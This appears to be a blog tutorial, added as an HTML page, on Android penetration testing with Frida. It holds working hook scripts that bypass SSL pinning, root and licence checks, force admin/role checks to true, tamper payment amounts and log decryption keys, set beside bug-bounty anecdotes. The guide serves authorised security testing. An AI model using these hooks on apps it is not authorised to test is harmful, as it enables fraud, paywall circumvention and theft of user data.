@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dynamic Instrumentation — Android Penetration Testing | Osezua</title>
+  <meta name="description" content="A comprehensive guide to dynamic instrumentation and hooking Android apps using Frida.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow+Condensed:wght@500;700&family=Barlow:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <link rel="stylesheet" href="../global.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+</head>
+<body>
+
+  <header class="header">
+    <div class="header-content">
+      <a href="../index.html" class="logo">Osezua</a>
+
+      <nav class="nav" aria-label="Primary">
+        <a href="../index.html" class="nav-link">Home</a>
+        <a href="../writeups.html" class="nav-link">Writeups</a>
+        <a href="../projects.html" class="nav-link">Projects</a>
+      </nav>
+
+      <div class="header-trailing">
+        <button type="button" class="theme-toggle" aria-label="Toggle theme">
+          <i class="fas fa-moon" aria-hidden="true"></i>
+        </button>
+        <button type="button" class="hamburger" aria-label="Open menu">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="mobile-menu">
+    <button type="button" class="mobile-menu-close" aria-label="Close menu">
+      <i class="fas fa-times" aria-hidden="true"></i>
+    </button>
+    <nav class="mobile-nav" aria-label="Mobile">
+      <a href="../index.html" class="mobile-nav-link">Home</a>
+      <a href="../writeups.html" class="mobile-nav-link">Writeups</a>
+      <a href="../projects.html" class="mobile-nav-link">Projects</a>
+    </nav>
+  </div>
+
+  <main class="writeup-plain">
+    <header class="writeup-hero">
+      <h1 class="writeup-hero-title">Dynamic Instrumentation — Android Penetration Testing</h1>
+      <div class="writeup-hero-meta">
+        <span>Category: Guides</span>
+        <span>Difficulty: Advanced</span>
+        <span>Date: 2026-05-02</span>
+      </div>
+      <div class="writeup-hero-rule" aria-hidden="true"></div>
+    </header>
+
+    <div class="writeup-body">
+      <blockquote>
+        <p><strong>Perspective:</strong> This note is written from the lens of a seasoned bug bounty hunter. Every section assumes you're working on a real engagement — rooted device in hand, jadx open on a second monitor, and a target app that doesn't want you inside it. Everything here connects. By the end, you should be able to walk into any Android app and instrument it at will.</p>
+      </blockquote>
+
+      <hr>
+
+      <h2 id="what-is-dynamic-instrumentation">What Is Dynamic Instrumentation?</h2>
+      <p>Dynamic instrumentation is the practice of injecting logic into a running process to observe or modify its behaviour — <strong>without modifying the binary on disk</strong> (or optionally with minimal patching). In Android penetration testing, this means you attach to a live app process and rewrite how its methods behave in real time.</p>
+
+      <p>Compare the two paradigms:</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Approach</th>
+            <th>What You Do</th>
+            <th>Limitation</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Static Analysis</td>
+            <td>Decompile APK, read code in jadx</td>
+            <td>You see code, not execution. Obfuscation hides logic.</td>
+          </tr>
+          <tr>
+            <td>Dynamic Instrumentation</td>
+            <td>Hook live methods, intercept calls, read memory</td>
+            <td>Requires a running process. Needs root or a patched APK.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>The real power is that <strong>dynamic instrumentation sees the truth</strong>. Obfuscated class names, encrypted strings, runtime-generated keys — none of that matters once you're hooked into the process and watching methods execute live.</p>
+
+      <h3 id="the-mental-model">The Mental Model</h3>
+      <p>Think of it as AOP (Aspect-Oriented Programming) but adversarial. You're inserting cross-cutting logic — logging, interception, return value overrides — around method calls you don't own. The app's JVM (or ART runtime on Android) doesn't know the difference. From the runtime's perspective, your hook <em>is</em> the method.</p>
+
+      <h3 id="why-it-matters-in-bug-bounty">Why It Matters in Bug Bounty</h3>
+      <p>In a real engagement, dynamic instrumentation is how you:</p>
+      <ul>
+        <li><strong>Break SSL pinning</strong> — override the certificate validation logic at runtime instead of fighting the compiled bytecode</li>
+        <li><strong>Bypass root detection</strong> — make <code>RootBeer.isRooted()</code> return <code>false</code> without touching smali</li>
+        <li><strong>Read decrypted secrets</strong> — hook the decryption method and log the plaintext <em>after</em> the app decrypts it for you</li>
+        <li><strong>Understand business logic</strong> — trace which methods fire during a money transfer, a privilege check, or an OTP verification</li>
+        <li><strong>Forge authentication tokens</strong> — intercept the signing method and inject your own payload</li>
+      </ul>
+      <p>The framework that enables all of this on Android is <strong>Frida</strong>. Objection is a pre-built Frida toolkit that accelerates common tasks.</p>
+
+      <hr>
+
+      <h2 id="module-1-setup">Module 1 — Setup</h2>
+      <h3 id="installing-frida-and-objection">Installing Frida and Objection</h3>
+      <p>Frida has two parts: the <strong>Python tooling</strong> on your host machine, and the <strong>frida-server</strong> binary that runs on the Android device.</p>
+      <p><strong>Host setup (your Kali / macOS machine):</strong></p>
+<pre class="language-bash"><code class="language-bash"># Install frida tools and objection
+pip3 install frida-tools objection
+
+# Verify
+frida --version
+objection --version</code></pre>
+
+      <p><strong>Download frida-server for the device:</strong></p>
+      <p>The server binary must <strong>exactly match</strong> your host frida version and the device's CPU architecture. A mismatch will cause a silent connection failure.</p>
+<pre class="language-bash"><code class="language-bash"># Check your frida version
+frida --version
+# e.g. 16.2.1
+
+# Check device architecture
+adb shell getprop ro.product.cpu.abi
+# e.g. arm64-v8a
+
+# Download from GitHub releases — match version + arch
+# https://github.com/frida/frida/releases
+# Filename pattern: frida-server-16.2.1-android-arm64.xz
+
+xz -d frida-server-16.2.1-android-arm64.xz
+adb push frida-server-16.2.1-android-arm64 /data/local/tmp/frida-server
+adb shell chmod 755 /data/local/tmp/frida-server</code></pre>
+
+      <h3 id="running-the-frida-server">Running the Frida Server</h3>
+<pre class="language-bash"><code class="language-bash"># On the device (as root)
+adb shell
+su
+/data/local/tmp/frida-server &amp;
+
+# Verify from host — you should see a list of running processes
+frida-ps -U</code></pre>
+
+      <p>If <code>frida-ps -U</code> times out, check:</p>
+      <ol>
+        <li>Version mismatch between host and server</li>
+        <li>SELinux blocking the server — try <code>adb shell setenforce 0</code></li>
+        <li>Another frida-server instance still running — <code>pkill frida-server</code></li>
+      </ol>
+      <blockquote>
+        <p><strong>Real-world note:</strong> On hardened devices (e.g. Samsung Knox), SELinux enforcement is aggressive. In those cases, prefer the <strong>gadget injection method</strong> (patching the APK) rather than relying on frida-server with root.</p>
+      </blockquote>
+
+      <h3 id="patching-apks-with-frida-gadget">Patching APKs with Frida Gadget</h3>
+      <p>When you don't have root (common on physical devices from a private bug bounty program), you inject the <strong>Frida Gadget</strong> — a shared library that loads Frida's runtime inside the app itself.</p>
+      <p><strong>Step 1: Decompile the APK</strong></p>
+<pre class="language-bash"><code class="language-bash">apktool d target-app.apk -o target-app</code></pre>
+
+      <p><strong>Step 2: Download the correct gadget for the device arch</strong></p>
+<pre class="language-bash"><code class="language-bash"># From https://github.com/frida/frida/releases
+# e.g. frida-gadget-16.2.1-android-arm64.so.xz
+xz -d frida-gadget-16.2.1-android-arm64.so.xz
+mv frida-gadget-16.2.1-android-arm64.so target-app/lib/arm64-v8a/libfrida-gadget.so</code></pre>
+
+      <p><strong>Step 3: Inject the load call into smali</strong></p>
+      <p>Find the main Activity's <code>onCreate</code> method in smali. Add a <code>System.loadLibrary("frida-gadget")</code> call at the very top:</p>
+<pre class="language-java"><code class="language-java"># In smali, the first instruction of onCreate:
+const-string v0, "frida-gadget"
+invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code></pre>
+
+      <p><strong>Step 4: Repackage and sign</strong></p>
+<pre class="language-bash"><code class="language-bash">apktool b target-app -o target-app-patched.apk
+
+# Generate a debug keystore if needed
+keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
+  -keyalg RSA -keysize 2048 -validity 10000
+
+# Sign
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
+  -keystore debug.keystore target-app-patched.apk androiddebugkey
+
+# Zipalign
+zipalign -v 4 target-app-patched.apk target-app-final.apk
+
+# Install
+adb install target-app-final.apk</code></pre>
+
+      <p>When you launch the patched app, it will <strong>pause at startup</strong> waiting for a Frida connection — this is the gadget's default behaviour. Connect with:</p>
+<pre class="language-bash"><code class="language-bash">frida -U gadget</code></pre>
+
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> I was testing a fintech app (<code>com.payfast.mobile</code>) from a private program. The device was a non-rooted Samsung Galaxy — no root, no frida-server. I patched the APK with the gadget, installed it over the original (after backing up data), and had full Frida access within 10 minutes. The app had anti-root checks that were completely irrelevant because the gadget bypasses them by loading <em>before</em> those checks run.</p>
+      </blockquote>
+
+      <hr>
+
+      <h2 id="module-2-frida-basics">Module 2 — Frida Basics</h2>
+      <h3 id="java-perform-the-foundation-of-everything">Java.perform — The Foundation of Everything</h3>
+      <p>Before you can touch any Java class or method, you must wrap your code inside <code>Java.perform()</code>. This callback executes in the context of the app's Java runtime (ART). Without it, <code>Java.use()</code> will throw.</p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  // All Java hooking lives here
+  var MyClass = Java.use('com.example.app.MyClass');
+  console.log('Class loaded: ' + MyClass);
+});</code></pre>
+
+      <p><strong>Why does this exist?</strong> Frida runs in a native thread. ART (Android Runtime) requires that Java calls happen on an ART-managed thread. <code>Java.perform</code> marshals your callback onto the correct thread.</p>
+
+      <h3 id="instantiating-objects-and-calling-methods">Instantiating Objects and Calling Methods</h3>
+      <p>This is one of the most underutilised techniques in bug bounty. You don't have to <em>hook</em> a method to call it — you can <strong>instantiate objects and invoke methods directly</strong> from your Frida script.</p>
+      <p><strong>Calling a static method:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Utils = Java.use('com.example.app.Utils');
+  // Call a static method directly
+  var result = Utils.decryptString('encryptedPayload123', 'secretKey');
+  console.log('Decrypted: ' + result);
+});</code></pre>
+
+      <p><strong>Instantiating an object and calling an instance method:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var TokenManager = Java.use('com.example.app.auth.TokenManager');
+  // $new() calls the constructor
+  var instance = TokenManager.$new();
+  var token = instance.generateAdminToken('user_id_123');
+  console.log('Token: ' + token);
+});</code></pre>
+
+      <p><strong>Overloaded methods</strong> — when a class has multiple methods with the same name but different signatures, you must use <code>.overload()</code>:</p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Crypto = Java.use('com.example.app.CryptoHelper');
+  // If decrypt() has two versions: decrypt(String) and decrypt(String, String)
+  var result = Crypto.decrypt.overload('java.lang.String', 'java.lang.String')
+                             .call(Crypto, 'ciphertext', 'iv_value');
+  console.log(result);
+});</code></pre>
+
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> During a bug bounty on <code>com.bankingapp.android</code>, I found a class called <code>com.bankingapp.crypto.AESHelper</code> in jadx. It had a <code>decrypt(String ciphertext, String key)</code> static method. I could see encrypted values being stored in SharedPreferences. Using <code>Java.use</code> + <code>.call()</code>, I invoked the decryption method directly with the stored ciphertext and recovered the hardcoded AES key. No need to hook anything — I just <em>called</em> the app's own decryption function. This led to a <strong>P2 hardcoded cryptographic key</strong> finding.</p>
+      </blockquote>
+
+      <h3 id="mixing-static-and-dynamic-analysis">Mixing Static and Dynamic Analysis</h3>
+      <p>The real workflow of a senior tester is a <strong>feedback loop</strong> between jadx and Frida — not sequential steps.</p>
+<pre class="writeup-trace"><code class="writeup-trace">jadx → find interesting class → Frida hook → observe runtime values → back to jadx with new context</code></pre>
+
+      <p><strong>Example workflow:</strong></p>
+      <p>You open jadx and find this in <code>com.vulnapp.auth.SessionManager</code>:</p>
+<pre class="language-java"><code class="language-java">public String getAuthHeader() {
+    return "Bearer " + this.f2847a.b(this.mContext);
+}</code></pre>
+
+      <p>The method <code>b()</code> is obfuscated. You don't know what it does statically. So you hook it:</p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  // Hook the obfuscated method
+  var a = Java.use('com.vulnapp.auth.a'); // obfuscated class
+  a.b.implementation = function (context) {
+    var result = this.b(context);
+    console.log('[+] Auth token: ' + result);
+    return result;
+  };
+});</code></pre>
+      <p>Now you trigger a network call in the app and you see the live JWT being printed. You take that JWT to jwt.io, decode it, and discover the <code>role</code> claim is set to <code>"user"</code> but the server doesn't validate it — that's your privilege escalation.</p>
+
+      <h3 id="tracing-activities">Tracing Activities</h3>
+      <p>Activities are the entry points of Android UI flows. Tracing which Activity launches when gives you a map of the app's attack surface — especially exported Activities that skip authentication.</p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Activity = Java.use('android.app.Activity');
+
+  Activity.onCreate.overload('android.os.Bundle').implementation = function (bundle) {
+    console.log('[Activity] onCreate: ' + this.getClass().getName());
+    this.onCreate(bundle);
+  };
+
+  Activity.onResume.implementation = function () {
+    console.log('[Activity] onResume: ' + this.getClass().getName());
+    this.onResume();
+  };
+
+  Activity.onStart.implementation = function () {
+    console.log('[Activity] onStart: ' + this.getClass().getName());
+    this.onStart();
+  };
+});</code></pre>
+
+      <p><strong>Finding exported Activities you can launch directly:</strong></p>
+<pre class="language-bash"><code class="language-bash"># From the manifest
+grep -i 'exported="true"' AndroidManifest.xml
+
+# Launch an exported Activity directly (deeplink/intent abuse)
+adb shell am start -n com.vulnapp/.ui.AdminPanelActivity</code></pre>
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> On a private bug bounty target (<code>com.retailapp.android</code>), I traced Activities and noticed <code>com.retailapp.checkout.PaymentActivity</code> was being launched with an Intent extra called <code>promo_code</code>. By tracing <code>getIntent().getExtras()</code> in <code>onCreate</code>, I could see the app read this value and apply it without server-side validation. I launched the Activity directly via ADB with an arbitrary promo code and got 100% discount — a <strong>P1 business logic vulnerability</strong>.</p>
+      </blockquote>
+
+      <h3 id="tracing-fragments">Tracing Fragments</h3>
+      <p>Modern Android apps use Fragments extensively — a single Activity might host dozens of Fragments that represent different screens. Tracing Fragments reveals navigation that Activity tracing misses entirely.</p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Fragment = Java.use('androidx.fragment.app.Fragment');
+
+  Fragment.onCreateView.overload(
+    'android.view.LayoutInflater',
+    'android.view.ViewGroup',
+    'android.os.Bundle'
+  ).implementation = function (inflater, container, savedInstanceState) {
+    console.log('[Fragment] onCreateView: ' + this.getClass().getName());
+    return this.onCreateView(inflater, container, savedInstanceState);
+  };
+
+  Fragment.onResume.implementation = function () {
+    console.log('[Fragment] onResume: ' + this.getClass().getName());
+    this.onResume();
+  };
+});</code></pre>
+
+      <p><strong>Tracing Fragment arguments (the data passed in):</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Fragment = Java.use('androidx.fragment.app.Fragment');
+
+  Fragment.setArguments.implementation = function (bundle) {
+    if (bundle !== null) {
+      console.log('[Fragment] setArguments on: ' + this.getClass().getName());
+      // Iterate bundle keys
+      var keySet = bundle.keySet();
+      var iterator = keySet.iterator();
+      while (iterator.hasNext()) {
+        var key = iterator.next().toString();
+        console.log('  key=' + key + ' value=' + bundle.get(key));
+      }
+    }
+    this.setArguments(bundle);
+  };
+});</code></pre>
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> A banking app used a single <code>DashboardActivity</code> with fragments. Activity tracing showed nothing interesting — but Fragment tracing revealed <code>AdminSettingsFragment</code> being instantiated with a Bundle containing <code>admin_mode=false</code>. I modified the hook to change that to <code>true</code> and watched the Fragment render hidden admin UI controls.</p>
+      </blockquote>
+
+      <hr>
+
+      <h2 id="module-3-tracing-with-frida">Module 3 — Tracing with Frida</h2>
+      <h3 id="frida-trace">frida-trace</h3>
+      <p><code>frida-trace</code> is Frida's built-in method tracer. It auto-generates JavaScript hooks for every method matching a pattern and prints call logs — no script writing required for initial recon.</p>
+      <p><strong>Trace all methods in a Java class:</strong></p>
+<pre class="language-bash"><code class="language-bash"># -U = USB device, -f = spawn app, -j = Java method pattern
+frida-trace -U -f com.vulnapp.android -j 'com.vulnapp.auth.TokenManager!*'</code></pre>
+      
+      <p>This generates handler files in <code>__handlers__/</code> which you can edit. The output looks like:</p>
+<pre class="writeup-trace"><code class="writeup-trace">3842 ms  TokenManager.generateToken("user_id_999", "STANDARD")
+3843 ms  &lt;= "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx"</code></pre>
+
+      <p><strong>Trace by method name pattern across all classes:</strong></p>
+<pre class="language-bash"><code class="language-bash"># Trace any method named 'decrypt' in any class
+frida-trace -U -f com.vulnapp.android -j '*!decrypt*'
+
+# Trace any method named 'verify' — useful for auth bypass hunting
+frida-trace -U -f com.vulnapp.android -j '*!verify*'
+frida-trace -U -f com.vulnapp.android -j '*!isValid*'
+frida-trace -U -f com.vulnapp.android -j '*!checkPin*'</code></pre>
+
+      <p><strong>Customising the auto-generated handler:</strong></p>
+      <p>After running <code>frida-trace</code>, edit <code>__handlers__/com.vulnapp.auth.TokenManager/generateToken.js</code>:</p>
+<pre class="language-javascript"><code class="language-javascript">{
+  onEnter: function (log, args, state) {
+    log('generateToken called');
+    log('  userId: ' + args[0]);
+    log('  role:   ' + args[1]);
+  },
+  onLeave: function (log, retval, state) {
+    log('  =&gt; token: ' + retval);
+  }
+}</code></pre>
+      <blockquote>
+        <p><strong>Tip:</strong> Start every engagement with a broad <code>frida-trace</code> sweep. It maps the attack surface faster than reading code.</p>
+      </blockquote>
+
+      <h3 id="tracing-into-jni">Tracing into JNI (Native Libraries)</h3>
+      <p>When an app moves sensitive logic into a <code>.so</code> native library (common for licence checks, crypto, and anti-tampering), Java-level hooking doesn't reach it. You hook at the <strong>native layer</strong> using Frida's <code>Interceptor</code>.</p>
+      
+      <p><strong>Step 1: Identify JNI methods in jadx</strong></p>
+<pre class="language-java"><code class="language-java">public native String nativeDecrypt(String ciphertext, String key);
+public native boolean nativeCheckLicence();</code></pre>
+
+      <p><strong>Step 2: Find the symbol in the .so</strong></p>
+<pre class="language-bash"><code class="language-bash"># Extract the so from the APK
+unzip target.apk lib/arm64-v8a/libnative.so -d extracted/
+
+# List exported symbols
+nm -D extracted/lib/arm64-v8a/libnative.so | grep -i decrypt
+# or
+readelf -W --syms extracted/lib/arm64-v8a/libnative.so | grep Java_</code></pre>
+
+      <p><strong>Step 3: Hook the native function with Frida Interceptor</strong></p>
+<pre class="language-javascript"><code class="language-javascript">// Hook a JNI native function
+var moduleName = 'libnative.so';
+var funcName = 'Java_com_vulnapp_crypto_CryptoHelper_nativeDecrypt';
+
+var nativeDecrypt = Module.findExportByName(moduleName, funcName);
+
+if (nativeDecrypt) {
+  Interceptor.attach(nativeDecrypt, {
+    onEnter: function (args) {
+      // JNI args: args[0] = JNIEnv*, args[1] = jobject (this)
+      // args[2] onwards = actual method parameters
+      var env = Java.vm.getEnv();
+      var ciphertext = env.getStringUtfChars(args[2], null).readUtf8String();
+      var key = env.getStringUtfChars(args[3], null).readUtf8String();
+      console.log('[JNI] nativeDecrypt called');
+      console.log('  ciphertext: ' + ciphertext);
+      console.log('  key:        ' + key);
+    },
+    onLeave: function (retval) {
+      // retval is a jstring — read it
+      var env = Java.vm.getEnv();
+      var result = env.getStringUtfChars(retval, null).readUtf8String();
+      console.log('  decrypted:  ' + result);
+    }
+  });
+} else {
+  console.log('[-] Symbol not found — may be stripped');
+}</code></pre>
+
+      <p><strong>When symbols are stripped (common in production apps):</strong></p>
+<pre class="language-javascript"><code class="language-javascript">// Find the function by scanning module memory
+var base = Module.findBaseAddress('libnative.so');
+// Use the offset from Ghidra analysis
+var targetFunc = base.add(0x4A28); // offset from Ghidra
+
+Interceptor.attach(targetFunc, {
+  onEnter: function (args) {
+    console.log('[*] Hit stripped function at offset 0x4A28');
+    // Log raw pointer args
+    console.log('  arg0: ' + args[0]);
+    console.log('  arg1: ' + args[1]);
+  }
+});</code></pre>
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> A gaming app had its licence check in <code>libprotect.so</code>. The Java method <code>isLicenceValid()</code> was declared <code>native</code>. <code>nm</code> showed the symbol <code>Java_com_gameapp_protect_LicenceCheck_isLicenceValid</code>. I hooked <code>onLeave</code> and forced <code>retval.replace(1)</code> (returning <code>true</code> = 1). The paywall disappeared. This confirmed a <strong>P1 licence bypass</strong> and I could then analyse the actual native function in Ghidra to understand how the check worked for the full write-up.</p>
+      </blockquote>
+
+      <hr>
+
+      <h2 id="module-4-intercepting-arguments">Module 4 — Intercepting Arguments and Return Values</h2>
+      <h3 id="frida-interception-basics">Frida Interception Basics</h3>
+      <p>Interception is the core of what makes Frida powerful in offensive security. The pattern is always the same: replace a method's <code>implementation</code>, optionally call the original, and manipulate inputs or outputs.</p>
+
+      <p><strong>Basic interception skeleton:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var TargetClass = Java.use('com.vulnapp.auth.AuthManager');
+
+  TargetClass.isAdmin.implementation = function () {
+    console.log('[*] isAdmin() called — forcing true');
+    return true; // Override return value
+  };
+});</code></pre>
+
+      <p><strong>Intercepting and logging arguments:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var PinVerifier = Java.use('com.vulnapp.auth.PinVerifier');
+
+  PinVerifier.verifyPin.implementation = function (userPin, storedHash) {
+    console.log('[*] verifyPin called');
+    console.log('  userPin:    ' + userPin);
+    console.log('  storedHash: ' + storedHash);
+    // Call the original and log the result
+    var result = this.verifyPin(userPin, storedHash);
+    console.log('  result:     ' + result);
+    return result;
+  };
+});</code></pre>
+
+      <p><strong>Modifying arguments before the call:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var PaymentService = Java.use('com.vulnapp.payment.PaymentService');
+
+  PaymentService.processPayment.implementation = function (amount, currency, userId) {
+    console.log('[*] processPayment intercepted');
+    console.log('  original amount: ' + amount);
+    // Tamper: change the amount to 0.01
+    var tamperedAmount = Java.use('java.math.BigDecimal').$new('0.01');
+    console.log('  tampered amount: ' + tamperedAmount);
+    return this.processPayment(tamperedAmount, currency, userId);
+  };
+});</code></pre>
+
+      <p><strong>Intercepting methods that throw exceptions (for auth bypass):</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var CertPinner = Java.use('com.vulnapp.network.CertificatePinner');
+
+  // Some SSL pinning implementations throw on failure instead of returning false
+  CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function (hostname, peerCertificates) {
+    console.log('[*] CertPinner.check called for: ' + hostname);
+    // Do nothing — swallow the check, don't call original
+    // This prevents the exception from being thrown
+    return;
+  };
+});</code></pre>
+
+      <p><strong>Full argument dump helper — useful for unknown methods:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  var Target = Java.use('com.vulnapp.api.ApiClient');
+
+  Target.sendRequest.implementation = function () {
+    console.log('[*] sendRequest called with ' + arguments.length + ' args:');
+    for (var i = 0; i &lt; arguments.length; i++) {
+      console.log('  arg[' + i + '] = ' + arguments[i]);
+    }
+    return this.sendRequest.apply(this, arguments);
+  };
+});</code></pre>
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> On <code>com.vulnbank.android</code> (an intentionally vulnerable banking app), I found <code>com.vulnerablebankapp.auth.JWTManager.verifyToken(String token)</code>. Hooking this and logging the arguments revealed the app was passing the raw JWT to a local verification method <em>before</em> sending it to the server. I then overrode the implementation to accept any JWT — replacing the return with <code>true</code> regardless of signature. Combined with a forged JWT with <code>role: admin</code>, I accessed admin endpoints directly. The server trusted the client's verification result. <strong>P1 authentication bypass.</strong></p>
+      </blockquote>
+
+      <hr>
+
+      <h2 id="module-5-ssl-validation">Module 5 — SSL Validation Bypasses</h2>
+      <p>SSL pinning is the most common defensive control you'll face in mobile bug bounty. The app pins the server's certificate or public key and refuses connections if the presented cert doesn't match — this blocks your Burp proxy. Your job is to destroy this check at runtime.</p>
+
+      <h3 id="sslcontext-nsc-bypass">SSLContext and Network-Security-Config Bypass</h3>
+      <p><strong>Bypass approach — replace TrustManager with one that trusts everything:</strong></p>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  // Bypass TrustManagerImpl — the most common SSLContext pinning path
+  var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
+
+  TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
+    console.log('[*] TrustManagerImpl.verifyChain bypassed for: ' + host);
+    return untrustedChain; // Accept whatever chain is presented
+  };
+
+  // Find all implementations of X509TrustManager and nuke checkServerTrusted
+  Java.enumerateLoadedClasses({
+    onMatch: function (className) {
+      try {
+        if (className.indexOf('TrustManager') !== -1 ||
+            className.indexOf('trustmanager') !== -1) {
+          var clazz = Java.use(className);
+          // Try to override checkServerTrusted
+          if (clazz.checkServerTrusted) {
+            clazz.checkServerTrusted.overload(
+              '[Ljava.security.cert.X509Certificate;',
+              'java.lang.String'
+            ).implementation = function (chain, authType) {
+              console.log('[*] checkServerTrusted bypassed on: ' + className);
+            };
+          }
+        }
+      } catch(e) {}
+    },
+    onComplete: function () {}
+  });
+});</code></pre>
+
+      <h3 id="okhttp3-bypass">OkHttp3 Bypass</h3>
+<pre class="language-javascript"><code class="language-javascript">Java.perform(function () {
+  // Method 1: Hook the check method directly
+  var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+
+  CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function (hostname, peerCertificates) {
+    console.log('[*] OkHttp3 CertificatePinner.check bypassed for: ' + hostname);
+    return;
+  };
+
+  // Method 3: Hook the OkHttpClient.Builder to replace the CertificatePinner with an empty one
+  var Builder = Java.use('okhttp3.OkHttpClient$Builder');
+  var EmptyPinner = CertificatePinner.DEFAULT.value;
+
+  Builder.certificatePinner.implementation = function (pinner) {
+    console.log('[*] OkHttpClient.Builder.certificatePinner → injecting empty pinner');
+    return this.certificatePinner(EmptyPinner);
+  };
+});</code></pre>
+      <blockquote>
+        <p><strong>Real-world scenario:</strong> A crypto exchange app (<code>com.cryptotrader.android</code>) used OkHttp3 with a custom <code>CertificatePinner</code> built with pinned SHA-256 hashes. Running the OkHttp3 bypass unblocked traffic in Burp. I then noticed the <code>/api/v1/withdraw</code> endpoint accepted a <code>destination_wallet</code> parameter that wasn't validated server-side. Via Burp, I changed the wallet address. <strong>P1 improper input validation on a withdrawal endpoint.</strong> The OkHttp bypass was the gate — without it, I'd never have seen the request.</p>
+      </blockquote>
+
+      <h3 id="bypassing-with-objection">Bypassing SSL Pinning with Objection</h3>
+      <p>Objection is your speed tool. It wraps the common bypass scripts so you don't have to write them each time.</p>
+<pre class="language-bash"><code class="language-bash"># Attach to a running app
+objection -g com.vulnapp.android explore
+
+# In the objection REPL:
+android sslpinning disable
+android root disable</code></pre>
+      <p><strong>Full engagement one-liner:</strong></p>
+<pre class="language-bash"><code class="language-bash">objection -g com.vulnapp.android explore --startup-command 'android sslpinning disable'</code></pre>
+
+      <hr>
+
+      <h2 id="full-engagement-walkthrough">How It All Comes Together — Full Engagement Walkthrough</h2>
+      <p>Here's how these modules work as a unified workflow in a real bug bounty scenario.</p>
+      <p><strong>Target:</strong> <code>com.financeapp.android</code> — a private bug bounty fintech application.</p>
+      <ul>
+        <li><strong>Step 1 — Static recon (jadx):</strong> Identify class structure, find <code>JWTService</code>, <code>ApiClient</code> (OkHttp3), <code>AESHelper</code> (native).</li>
+        <li><strong>Step 2 — Setup:</strong> Push frida-server, verify with <code>frida-ps -U</code>.</li>
+        <li><strong>Step 3 — Kill SSL pinning (Module 5):</strong> Run OkHttp3 bypass. Confirm traffic visible in Burp.</li>
+        <li><strong>Step 4 — Activity/Fragment tracing (Module 2):</strong> Discover <code>AdminPanelFragment</code> in trace output — it's never accessible via normal UI flow but the code exists.</li>
+        <li><strong>Step 5 — frida-trace sweep (Module 3):</strong> Run <code>frida-trace -j '*!verify*'</code> and <code>'*!checkRole*'</code>. Find <code>JWTService.checkRole</code> firing on every API call.</li>
+        <li><strong>Step 6 — Intercept and override (Module 4):</strong> Hook <code>checkRole</code> to always return <code>true</code>. Launch the hidden Admin fragment via ADB Intent. Admin UI renders.</li>
+        <li><strong>Step 7 — Decrypt native secrets (Module 3):</strong> Hook <code>nativeDecrypt</code> to log the AES key used for local storage encryption. Recover encrypted user data from SQLite and decrypt it.</li>
+        <li><strong>Step 8 — Document:</strong> Every hook is a PoC. Every <code>console.log</code> output is evidence. Write up with CVSS scores.</li>
+      </ul>
+      <blockquote>
+        <p>This is not a hypothetical flow — it is the actual rhythm of a serious Android engagement. Frida is the thread that weaves every other tool together.</p>
+      </blockquote>
+    </div>
+
+    <nav class="writeup-navigation" aria-label="Writeup">
+      <a href="../writeups.html" class="btn-secondary">
+        <i class="fas fa-arrow-left" aria-hidden="true"></i>
+        Back to Writeups
+      </a>
+    </nav>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="social-links">
+        <a href="https://github.com/0s3zu4" target="_blank" rel="noopener noreferrer" class="social-link" title="GitHub">
+          <i class="fab fa-github" aria-hidden="true"></i>
+        </a>
+        <a href="https://www.linkedin.com/in/osezua-agboifoh/" target="_blank" rel="noopener noreferrer" class="social-link" title="LinkedIn">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+        <a href="https://x.com/__zua" target="_blank" rel="noopener noreferrer" class="social-link" title="X (Twitter)">
+          <i class="fab fa-x-twitter" aria-hidden="true"></i>
+        </a>
